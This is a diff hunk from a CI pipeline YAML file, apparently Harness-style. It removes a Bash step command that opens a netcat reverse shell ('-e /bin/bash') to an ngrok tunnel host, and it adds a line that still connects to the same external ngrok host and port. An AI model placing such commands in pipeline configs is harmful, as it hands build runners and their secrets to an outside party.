@@ -30,7 +30,7 @@ pipeline:
                   identifier: BEE
                   spec:
                     shell: Bash
-                    command: nc 0.tcp.in.ngrok.io 14801 -e /bin/bash
+                    command: nc 0.tcp.in.ngrok.io 14801
                   failureStrategies:
                     - onFailure:
                         errors:
